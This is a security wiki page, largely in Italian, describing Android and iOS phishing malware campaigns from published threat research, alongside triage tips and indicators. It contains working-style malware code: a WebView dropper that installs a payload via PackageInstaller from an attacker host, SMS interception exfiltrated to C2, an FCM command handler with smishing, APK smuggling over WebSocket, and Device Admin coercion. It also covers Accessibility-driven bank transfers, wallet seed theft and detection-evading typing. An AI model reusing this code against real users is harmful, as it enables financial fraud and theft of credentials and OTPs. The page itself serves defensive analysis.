# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Questa pagina copre tecniche usate dagli attori di minaccia per distribuire **malicious Android APKs** e **iOS mobile-configuration profiles** tramite phishing (SEO, social engineering, fake stores, dating apps, ecc.).
> Il materiale è adattato dalla campagna SarangTrap esposta da Zimperium zLabs (2025) e da altre ricerche pubbliche.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registrare decine di domini look-alike (dating, cloud share, servizi auto…).
– Usare parole chiave nella lingua locale ed emoji nell'elemento `<title>` per posizionarsi su Google.
– Ospitare *both* istruzioni di installazione Android (`.apk`) e iOS sulla stessa landing page.
2. **First Stage Download**
* Android: link diretto a un APK *unsigned* o di “third-party store”.
* iOS: `itms-services://` o link HTTPS semplice a un profilo **mobileconfig** dannoso (vedi sotto).
3. **Post-install Social Engineering**
* Alla prima esecuzione l'app richiede un **invitation / verification code** (illusione di accesso esclusivo).
* Il codice viene **POSTed over HTTP** al Command-and-Control (C2).
* Il C2 risponde `{"success":true}` ➜ il malware continua.
* Le analisi dinamiche Sandbox / AV che non inviano mai un codice valido non osservano **comportamenti maligni** (evasion).
4. **Runtime Permission Abuse** (Android)
* Le permission dangerous sono richieste solo **dopo una risposta positiva dal C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Varianti recenti **rimuovono `<uses-permission>` per SMS da `AndroidManifest.xml`** ma lasciano il percorso di codice Java/Kotlin che legge gli SMS via reflection ⇒ abbassa il punteggio statico pur restando funzionale su dispositivi che concedono la permission tramite abuso di `AppOps` o su target legacy.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 ha introdotto **Restricted settings** per le app sideloaded: i toggle Accessibility e Notification Listener sono disabilitati finché l'utente non permette esplicitamente i restricted settings in **App info**.
* Pagine di phishing e droppers ora forniscono istruzioni UI passo‑passo per **consentire i restricted settings** all'app sideloaded e poi abilitare l'accesso Accessibility/Notification.
* Un bypass più recente installa il payload tramite un **session‑based PackageInstaller flow** (lo stesso metodo usato dagli app store). Android tratta l'app come installata dallo store, quindi Restricted settings non blocca più Accessibility.
* Suggerimento per triage: in un dropper, grep per `PackageInstaller.createSession/openSession` più codice che immediatamente naviga la vittima a `ACTION_ACCESSIBILITY_SETTINGS` o `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* L'app mostra viste innocue (SMS viewer, gallery picker) implementate localmente.
* Nel frattempo esfiltra:
- IMEI / IMSI, numero di telefono
- Full `ContactsContract` dump (JSON array)
- JPEG/PNG da `/sdcard/DCIM` compressi con [Luban](https://github.com/Curzibn/Luban) per ridurre le dimensioni
- Contenuto SMS opzionale (`content://sms`)
I payload vengono **batch-zipped** e inviati via `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* Un singolo **mobile-configuration profile** può richiedere `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ecc. per enrollare il dispositivo in una supervisione tipo “MDM”.
* Istruzioni di social engineering:
1. Apri Settings ➜ *Profile downloaded*.
2. Tocca *Install* tre volte (screenshot sulla pagina di phishing).
3. Trust il profilo non firmato ➜ l'attaccante ottiene gli entitlement *Contacts* & *Photo* senza revisione App Store.
8. **iOS Web Clip Payload (phishing app icon)**
* I payload `com.apple.webClip.managed` possono **pinnare un URL di phishing alla Home Screen** con icona/etichetta brandizzata.
* Web Clips possono essere eseguiti **full‑screen** (nascondono l'UI del browser) e essere marcati **non‑removable**, costringendo la vittima a cancellare il profilo per rimuovere l'icona.
9. **Network Layer**
* Plain HTTP, spesso su porta 80 con HOST header come `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → facile da individuare).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Durante la valutazione del malware, automatizzare la fase del invitation code con Frida/Objection per raggiungere il ramo maligno.
* **Manifest vs. Runtime Diff** – Confrontare `aapt dump permissions` con il runtime `PackageManager#getRequestedPermissions()`; permission dangerous mancanti sono un red flag.
* **Network Canary** – Configurare `iptables -p tcp --dport 80 -j NFQUEUE` per rilevare raffiche di POST non coerenti dopo l'inserimento del codice.
* **mobileconfig Inspection** – Usare `security cms -D -i profile.mobileconfig` su macOS per elencare `PayloadContent` e individuare entitlement eccessivi.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indicatori (Generici)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Questo pattern è stato osservato in campaign che abusano di temi legati a benefici governativi per rubare le credenziali UPI indiane e gli OTP. Gli operatori concatenano piattaforme reputate per la distribuzione e la resilienza.

### Catena di distribuzione attraverso piattaforme affidabili
- YouTube video lure → la descrizione contiene un short link
- Shortlink → sito di phishing su GitHub Pages che imita il portale legittimo
- Lo stesso repo GitHub ospita un APK con un falso badge “Google Play” che punta direttamente al file
- Pagine di phishing dinamiche sono ospitate su Replit; il canale comandi remoto usa Firebase Cloud Messaging (FCM)

### Dropper con payload incorporato e installazione offline
- Il primo APK è un installer (dropper) che include il vero malware in `assets/app.apk` e chiede all'utente di disabilitare Wi‑Fi/dati mobili per attenuare il rilevamento nel cloud.
- Il payload incorporato si installa sotto un'etichetta innocua (es., “Secure Update”). Dopo l'installazione, sia l'installer che il payload sono presenti come app separate.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Scoperta dinamica degli endpoint via shortlink
- Malware recupera una lista plain-text, separata da virgole, di endpoint live da uno shortlink; semplici string transforms producono il percorso finale della pagina di phishing.

Esempio (sanitizzato):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-codice:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Raccolta di credenziali UPI basata su WebView
- Il passaggio “Make payment of ₹1 / UPI‑Lite” carica un form HTML dell'attaccante dall'endpoint dinamico all'interno di una WebView e cattura campi sensibili (telefono, banca, UPI PIN) che vengono inviati via `POST` a `addup.php`.

Loader minimale:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Vengono richieste autorizzazioni aggressive alla prima esecuzione:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- I contatti vengono ciclati per inviare in massa smishing SMS dal dispositivo della vittima.
- Gli SMS in arrivo vengono intercettati da un broadcast receiver e caricati con metadati (sender, body, SIM slot, per-device random ID) su `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) come C2 resiliente
- Il payload si registra a FCM; i messaggi push contengono un campo `_type` usato come switch per attivare azioni (es., aggiornare i template di testo di phishing, abilitare/disabilitare comportamenti).

Esempio di payload FCM:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Schema dell'handler:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicatori/IOCs
- L'APK contiene un payload secondario in `assets/app.apk`
- WebView carica il pagamento da `gate.htm` ed esfiltra verso `/addup.php`
- Esfiltrazione SMS verso `/addsm.php`
- Recupero della configurazione tramite shortlink (es. `rebrand.ly/*`) che restituisce endpoint CSV
- App etichettate come generiche “Update/Secure Update”
- Messaggi FCM `data` con discriminatore `_type` in app non attendibili

---

## Smuggling di APK basato su Socket.IO/WebSocket + Pagine false di Google Play

Gli attaccanti sostituiscono sempre più spesso i link APK statici con un canale Socket.IO/WebSocket incorporato in esche con aspetto di Google Play. Questo nasconde l'URL del payload, aggira i filtri per URL/estensioni e mantiene un'esperienza di installazione realistica.

Flusso client tipico osservato in the wild:

<details>
<summary>Downloader fake di Google Play con Socket.IO (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Perché sfugge a controlli semplici:
- No static APK URL is exposed; payload is reconstructed in memory from WebSocket frames.
- URL/MIME/extension filters that block direct .apk responses may miss binary data tunneled via WebSockets/Socket.IO.
- I crawler e le URL sandbox che non eseguono WebSockets non recupereranno il payload.

See also WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Abuso di Android Accessibility/Overlay e Device Admin, automazione ATS e orchestrazione relay NFC – caso di studio RatOn

La campagna RatOn banker/RAT (ThreatFabric) è un esempio concreto di come le operazioni di mobile phishing moderne mescolino WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, e persino orchestrazione relay NFC. Questa sezione astrarrà le tecniche riutilizzabili.

### Stage-1: WebView → ponte di installazione nativa (dropper)
Gli attaccanti presentano un WebView che punta a una pagina controllata dall'attaccante e iniettano un'interfaccia JavaScript che espone un installer nativo. Un tap su un bottone HTML invoca codice nativo che installa un APK di secondo stadio incluso negli assets del dropper e lo avvia direttamente.

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML sulla pagina:
```html
<button onclick="bridge.installApk()">Install</button>
```
Dopo l'installazione, il dropper avvia il payload tramite package/activity espliciti:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### Funnel di consenso: Accessibility + Device Admin + richieste runtime successive
Stage-2 apre un WebView che ospita una pagina “Access”. Il suo pulsante invoca un metodo esportato che porta la vittima alle impostazioni Accessibility e richiede l'abilitazione del servizio malevolo. Una volta concesso, il malware usa Accessibility per eseguire automaticamente clic attraverso i successivi dialoghi di permessi runtime (contacts, overlay, manage system settings, etc.) e richiede Device Admin.

- Accessibility aiuta programmaticamente ad accettare i prompt successivi trovando pulsanti come “Allow”/“OK” nell'albero dei nodi e inviando click.
- Controllo/richiesta del permesso Overlay:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Vedi anche:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Phishing/ricatto overlay tramite WebView
Gli operatori possono inviare comandi per:
- rendere un overlay a schermo intero da un URL, oppure
- fornire HTML inline caricato in un overlay WebView.

Usi probabili: coercizione (inserimento PIN), apertura del wallet per catturare i PIN, messaggi di ricatto. Tenere un comando per assicurarsi che il permesso per gli overlay sia concesso se mancante.

### Modello di controllo remoto – pseudo-schermo testuale + screen-cast
- Bassa larghezza di banda: scaricare periodicamente l'albero dei nodi Accessibility, serializzare i testi/ruoli/limiti visibili e inviarli al C2 come pseudo-schermo (comandi come `txt_screen` per invio singolo e `screen_live` per continuo).
- Alta fedeltà: richiedere MediaProjection e avviare screen-cast/registrazione su richiesta (comandi come `display` / `record`).

### ATS playbook (automazione di app bancarie)
Dato un task JSON, aprire l'app bancaria, guidare l'interfaccia utente tramite Accessibility con una combinazione di query testuali e tocchi per coordinate, e inserire il PIN di pagamento della vittima quando richiesto.

Esempio task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Testi di esempio visti in un flusso target (CZ → EN):
- "Nová platba" → "Nuovo pagamento"
- "Zadat platbu" → "Inserisci pagamento"
- "Nový příjemce" → "Nuovo beneficiario"
- "Domácí číslo účtu" → "Numero di conto domestico"
- "Další" → "Avanti"
- "Odeslat" → "Invia"
- "Ano, pokračovat" → "Sì, continua"
- "Zaplatit" → "Paga"
- "Hotovo" → "Fatto"

Gli operatori possono anche verificare/aumentare i limiti di trasferimento tramite comandi come `check_limit` e `limit` che navigano nella UI dei limiti in modo analogo.

### Estrazione seed di crypto wallet
Obiettivi come MetaMask, Trust Wallet, Blockchain.com, Phantom. Flusso: sbloccare (PIN rubato o password fornita), navigare in Sicurezza/Ripristino, rivelare/mostrare la seed phrase, keylog/exfiltrate it. Implementare selettori consapevoli della localizzazione (EN/RU/CZ/SK) per stabilizzare la navigazione tra le lingue.

### Coercizione Device Admin
Le Device Admin APIs vengono usate per aumentare le possibilità di cattura del PIN e per ostacolare la vittima:

- Blocco immediato:
```java
dpm.lockNow();
```
- Far scadere la credenziale corrente per forzare il cambio (Accessibility cattura il nuovo PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forzare lo sblocco non biometrico disabilitando le funzionalità biometriche del keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Nota: Molti controlli di DevicePolicyManager richiedono Device Owner/Profile Owner sui recenti Android; alcune build OEM possono essere permissive. Verificare sempre sul target OS/OEM.

### Orchestrazione relay NFC (NFSkate)
Stage-3 può installare e lanciare un modulo esterno di NFC-relay (es., NFSkate) e persino fornirgli un template HTML per guidare la vittima durante il relay. Questo permette cash-out contactless card-present insieme a ATS online.

Riferimento: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Set comandi operatore (esempio)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Anti-rilevamento ATS basato su Accessibility: cadenza di testo simile a quella umana e doppia iniezione di testo (Herodotus)

Threat actors increasingly blend Accessibility-driven automation with anti-detection tuned against basic behaviour biometrics. A recent banker/RAT shows two complementary text-delivery modes and an operator toggle to simulate human typing with randomized cadence.

- Discovery mode: enumerare i nodi visibili con selector e bounds per mirare con precisione gli input (ID, text, contentDescription, hint, bounds) prima di agire.
- Doppia iniezione di testo:
- Modalità 1 – `ACTION_SET_TEXT` direttamente sul nodo target (stabile, senza tastiera);
- Modalità 2 – impostazione clipboard + `ACTION_PASTE` nel nodo focalizzato (funziona quando il setText diretto è bloccato).
- Cadenza simile a quella umana: dividere la stringa fornita dall'operatore e inviarla carattere per carattere con ritardi randomizzati di 300–3000 ms tra gli eventi per eludere le euristiche di “machine-speed typing”. Implementato o aumentando progressivamente il valore via `ACTION_SET_TEXT`, o incollando un carattere alla volta.

<details>
<summary>Java sketch: scoperta dei nodi + input per-carattere ritardato via setText o clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Overlay bloccanti per copertura di frode:
- Eseguire il rendering di un `TYPE_ACCESSIBILITY_OVERLAY` a schermo intero con opacità controllata dall'operatore; mantenerlo opaco alla vittima mentre l'automazione remota procede sotto.
- Comandi tipicamente esposti: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Overlay minimo con alpha regolabile:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Primitivi di controllo dell'operatore spesso visti: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Riferimenti

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
